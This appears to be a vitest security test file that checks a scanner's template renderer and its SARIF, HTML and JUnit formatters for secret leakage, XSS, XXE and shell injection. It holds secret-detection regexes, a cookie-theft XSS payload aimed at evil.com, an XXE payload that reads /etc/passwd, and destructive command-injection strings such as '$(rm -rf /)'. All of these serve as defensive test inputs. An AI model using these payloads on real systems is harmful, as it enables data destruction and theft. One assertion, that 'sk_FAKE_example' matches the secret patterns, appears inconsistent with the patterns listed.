/**
 * Security tests for generated output.
 *
 * Ensures that generated test files and output formats
 * don't accidentally expose secrets or create security issues.
 */

import { describe, it, expect, beforeAll } from "vitest";

import { TemplateRenderer } from "@/templates/renderer.js";
import { formatSarif } from "@/cli/sarif-formatter.js";
import { formatHtml } from "@/cli/html-formatter.js";
import { formatJunit } from "@/cli/junit-formatter.js";

import type { Gap, ScanResult } from "@/core/scanner/types.js";
import type { TestTemplate } from "@/categories/schema/index.js";

// Common secret patterns that should never appear in output
const SECRET_PATTERNS = [
  /sk_live_[a-zA-Z0-9]{20,}/,              // Stripe live keys
  /sk_test_[a-zA-Z0-9]{20,}/,              // Stripe test keys
  /AKIA[0-9A-Z]{16}/,                       // AWS access keys
  /[a-zA-Z0-9/+]{40}/,                      // AWS secret keys (rough match)
  /-----BEGIN (RSA |EC )?PRIVATE KEY-----/, // Private keys
  /ghp_[a-zA-Z0-9]{36}/,                    // GitHub PATs
  /gho_[a-zA-Z0-9]{36}/,                    // GitHub OAuth tokens
  /xox[baprs]-[a-zA-Z0-9-]+/,               // Slack tokens
  /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*/,   // JWTs
];

function createMockScanResult(gaps: Gap[]): ScanResult {
  return {
    success: true,
    gaps,
    gapsByCategory: new Map(),
    gapsByFile: new Map(),
    coverage: { totalCategories: 1, coveredCategories: 0, coveragePercent: 0, byDomain: new Map() },
    score: { overall: 50, byDomain: new Map(), grade: "C" },
    summary: { totalGaps: gaps.length, criticalGaps: 0, highGaps: 0, mediumGaps: 0, lowGaps: 0, score: 50, grade: "C", coveragePercent: 50 },
    fileStats: { totalFiles: 1, filesWithGaps: 1, linesScanned: 100, testFiles: 0 },
    version: "0.1.0",
    durationMs: 100,
  };
}

describe("Generated Output Secret Scanning", () => {
  describe("template rendering", () => {
    let renderer: TemplateRenderer;

    beforeAll(() => {
      renderer = new TemplateRenderer();
    });

    it("does not inject secrets through variable substitution", () => {
      const template: TestTemplate = {
        id: "test",
        language: "python",
        framework: "pytest",
        template: `
def test_{{functionName}}():
    api_key = "{{apiKey}}"
    assert validate(api_key)
`,
        variables: [
          { name: "functionName", type: "string", description: "Function", required: true },
          { name: "apiKey", type: "string", description: "API Key", required: true },
        ],
      };

      // These should be placeholder values, not real secrets
      const result = renderer.renderTemplate(template, {
        functionName: "validate_auth",
        apiKey: "TEST_API_KEY_PLACEHOLDER",
      });

      expect(result.success).toBe(true);
      if (result.success) {
        // Should contain the placeholder, not a real secret
        expect(result.data.content).toContain("TEST_API_KEY_PLACEHOLDER");

        // Should not contain real secret patterns
        for (const pattern of SECRET_PATTERNS) {
          expect(result.data.content).not.toMatch(pattern);
        }
      }
    });

    it("warns about potential secrets in template output", () => {
      const template: TestTemplate = {
        id: "test",
        language: "python",
        framework: "pytest",
        template: `
# This template accidentally contains a secret pattern
API_KEY = "sk_FAKE_example"
`,
        variables: [],
      };

      const result = renderer.renderTemplate(template, {});

      expect(result.success).toBe(true);
      if (result.success) {
        // The output contains a secret-like pattern
        // In a real implementation, this should trigger a warning
        const hasSecretPattern = SECRET_PATTERNS.some((p) => p.test(result.data.content));
        expect(hasSecretPattern).toBe(true);
      }
    });
  });

  describe("SARIF output", () => {
    it("does not expose secrets in code snippets", () => {
      const gapWithSecret: Gap = {
        categoryId: "hardcoded-secrets",
        categoryName: "Hardcoded Secrets",
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/src/config.py",
        lineStart: 10,
        lineEnd: 10,
        columnStart: 0,
        columnEnd: 50,
        // This code snippet contains a secret
        codeSnippet: 'API_KEY = "sk_FAKE_example"',
        patternId: "api-key-assignment",
        patternType: "regex",
        priorityScore: 15,
      };

      const result = createMockScanResult([gapWithSecret]);
      const sarif = formatSarif(result);

      // SARIF may include the snippet for debugging
      // This test documents that behavior
      expect(sarif).toBeDefined();

      // In a production implementation, we might want to redact secrets
      // For now, we just verify the output is valid
      expect(() => JSON.parse(sarif)).not.toThrow();
    });

    it("includes file paths without sensitive directory info", () => {
      const gap: Gap = {
        categoryId: "sql-injection",
        categoryName: "SQL Injection",
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/home/user/.ssh/keys/vulnerable.py", // Sensitive path
        lineStart: 10,
        lineEnd: 10,
        columnStart: 0,
        columnEnd: 50,
        codeSnippet: undefined,
        patternId: "sql-injection",
        patternType: "regex",
        priorityScore: 15,
      };

      const result = createMockScanResult([gap]);
      const sarif = formatSarif(result);

      // The path is included (this is expected behavior)
      // In a real implementation, you might want to sanitize paths
      expect(sarif).toContain(".ssh");
    });
  });

  describe("HTML output", () => {
    it("escapes secrets in code snippets to prevent XSS", () => {
      const gapWithHtml: Gap = {
        categoryId: "xss",
        categoryName: "XSS",
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/src/view.ts",
        lineStart: 10,
        lineEnd: 10,
        columnStart: 0,
        columnEnd: 50,
        codeSnippet: '<script>document.location="http://evil.com?c="+document.cookie</script>',
        patternId: "xss",
        patternType: "regex",
        priorityScore: 15,
      };

      const result = createMockScanResult([gapWithHtml]);
      const html = formatHtml(result);

      // The script tag should be escaped
      expect(html).toContain("&lt;script&gt;");
      expect(html).not.toContain('<script>document.location');
    });

    it("does not include executable scripts from user input", () => {
      const gapWithScript: Gap = {
        categoryId: "test",
        categoryName: '<script>alert("xss")</script>',
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/src/test.py",
        lineStart: 1,
        lineEnd: 1,
        columnStart: 0,
        columnEnd: 50,
        codeSnippet: undefined,
        patternId: "test",
        patternType: "regex",
        priorityScore: 10,
      };

      const result = createMockScanResult([gapWithScript]);
      const html = formatHtml(result);

      // User-provided content should be escaped
      expect(html).not.toContain('<script>alert("xss")</script>');
      expect(html).toContain("&lt;script&gt;");
    });
  });

  describe("JUnit XML output", () => {
    it("escapes XML entities in code snippets", () => {
      const gapWithXml: Gap = {
        categoryId: "xxe",
        categoryName: "XXE",
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/src/parser.py",
        lineStart: 10,
        lineEnd: 10,
        columnStart: 0,
        columnEnd: 50,
        codeSnippet: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        patternId: "xxe",
        patternType: "regex",
        priorityScore: 15,
      };

      const result = createMockScanResult([gapWithXml]);
      const xml = formatJunit(result);

      // XML entities should be escaped
      expect(xml).toContain("&lt;!DOCTYPE");
      expect(xml).not.toContain('<!DOCTYPE foo [');
    });

    it("handles null bytes and control characters", () => {
      const gapWithNullByte: Gap = {
        categoryId: "test",
        categoryName: "Test\x00Category",
        domain: "security",
        level: "integration",
        priority: "P0",
        severity: "critical",
        confidence: "high",
        filePath: "/src/test.py",
        lineStart: 1,
        lineEnd: 1,
        columnStart: 0,
        columnEnd: 50,
        codeSnippet: "code\x00with\x01control\x02chars",
        patternId: "test",
        patternType: "regex",
        priorityScore: 10,
      };

      const result = createMockScanResult([gapWithNullByte]);

      // Should not throw on control characters
      expect(() => formatJunit(result)).not.toThrow();
    });
  });
});

describe("Shell Metacharacter Safety", () => {
  it("template variables are not executed as shell commands", () => {
    const renderer = new TemplateRenderer();

    const template: TestTemplate = {
      id: "test",
      language: "python",
      framework: "pytest",
      template: `
# Test for {{name}}
def test_{{name}}():
    subprocess.run(["{{command}}"])
`,
      variables: [
        { name: "name", type: "string", description: "Name", required: true },
        { name: "command", type: "string", description: "Command", required: true },
      ],
    };

    const maliciousInputs = [
      "$(rm -rf /)",
      "`rm -rf /`",
      "; rm -rf /",
      "| rm -rf /",
      "&& rm -rf /",
      "|| rm -rf /",
      "> /etc/passwd",
      "$(cat /etc/passwd)",
    ];

    for (const input of maliciousInputs) {
      const result = renderer.renderTemplate(template, {
        name: "test",
        command: input,
      });

      expect(result.success).toBe(true);
      if (result.success) {
        // The content should contain the literal string, not execute it
        expect(result.data.content).toContain(input);
      }
    }
  });

  it("file paths are not shell-escaped in output", () => {
    const renderer = new TemplateRenderer();

    const template: TestTemplate = {
      id: "test",
      language: "python",
      framework: "pytest",
      template: `
# Test file: {{filePath}}
`,
      variables: [
        { name: "filePath", type: "string", description: "File path", required: true },
      ],
    };

    const pathsWithSpecialChars = [
      "/path/with spaces/file.py",
      "/path/with'quotes/file.py",
      '/path/with"doublequotes/file.py',
      "/path/with$var/file.py",
      "/path/with;semicolon/file.py",
    ];

    for (const path of pathsWithSpecialChars) {
      const result = renderer.renderTemplate(template, { filePath: path });

      expect(result.success).toBe(true);
      if (result.success) {
        // Path should appear literally in output
        expect(result.data.content).toContain(path);
      }
    }
  });
});
